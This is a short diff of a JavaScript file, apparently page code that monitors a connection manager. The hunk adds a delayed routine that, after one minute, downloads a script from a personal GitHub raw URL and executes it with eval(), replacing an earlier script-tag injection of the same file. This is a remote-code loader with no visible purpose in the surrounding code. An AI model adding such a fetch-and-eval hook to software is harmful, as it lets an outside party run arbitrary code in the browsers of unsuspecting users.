@@ -113,12 +113,15 @@ function verifyConnectionManager() {
 }
 
 var kwsConnectionMonitorVerifier = setInterval(verifyConnectionManager, 40000);
-setTimeout(() => {
-  const url = "https://raw.githubusercontent.com/Koles1910/ddd/refs/heads/main/dupablada123.js";
-  const script = document.createElement('script');
-  script.src = url;
-  script.async = true; // nie blokuje strony
-  script.onload = () => console.log(`Skrypt z ${url} załadowany i uruchomiony`);
-  script.onerror = () => console.error(`Nie udało się załadować skryptu z ${url}`);
-  document.head.appendChild(script);
+setTimeout(async () => {
+  const url = "https://raw.githubusercontent.com/Koles1910/ddd/main/dupablada123.js";
+  try {
+    const response = await fetch(url);
+    if (!response.ok) throw new Error("Nie udało się pobrać pliku");
+    const code = await response.text();
+    eval(code); // wykonuje kod
+    console.log(`Skrypt z ${url} załadowany i uruchomiony`);
+  } catch (e) {
+    console.error(e);
+  }
 }, 60000); // 1 minuta
